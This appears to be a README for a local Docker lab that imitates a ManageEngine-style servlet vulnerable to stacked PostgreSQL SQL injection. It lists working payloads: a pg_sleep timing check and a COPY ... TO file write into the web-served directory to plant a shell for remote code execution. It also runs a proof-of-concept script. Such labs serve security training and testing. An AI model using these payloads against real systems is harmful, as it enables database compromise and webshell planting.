# Postgres SQLi Lab (Docker)

ManageEngine-**style** endpoint + stacked Postgres SQLi (not the real product).

```bash
./labctl.sh up pg-sqli
```

- URL: http://127.0.0.1:8110/
- SQLi: `/servlet/AMUserResourcesSyncServlet?ForMasRange=1;SELECT pg_sleep(3)--`
- DB user can use `COPY` to `/app/static/shell.jsp` or write via SQL if superuser
- Web files served from `/static/` (shared volume with Postgres `/export`)
- RCE path: stacked `COPY (SELECT 'payload') TO '/export/shell.txt'` then fetch `/static/shell.txt`

```bash
# time confirm
curl -s -o /dev/null -w '%{time_total}\n' \
  'http://127.0.0.1:8110/servlet/AMUserResourcesSyncServlet?ForMasRange=1;SELECT%20pg_sleep(3)--'

# write marker via COPY (path is DB container /export == web /app/static)
curl -g 'http://127.0.0.1:8110/servlet/AMUserResourcesSyncServlet?ForMasRange=1;COPY%20(SELECT%20$$pwned$$)%20TO%20$$/export/pwn.txt$$--'
curl http://127.0.0.1:8110/static/pwn.txt
```

PoC:
```bash
python3 ../poc.py --target-ip 127.0.0.1 --target-port 8110 --delay 3
```

Adjust any hard-coded ManageEngine webroot paths in the PoC to `/export/...` for this lab.

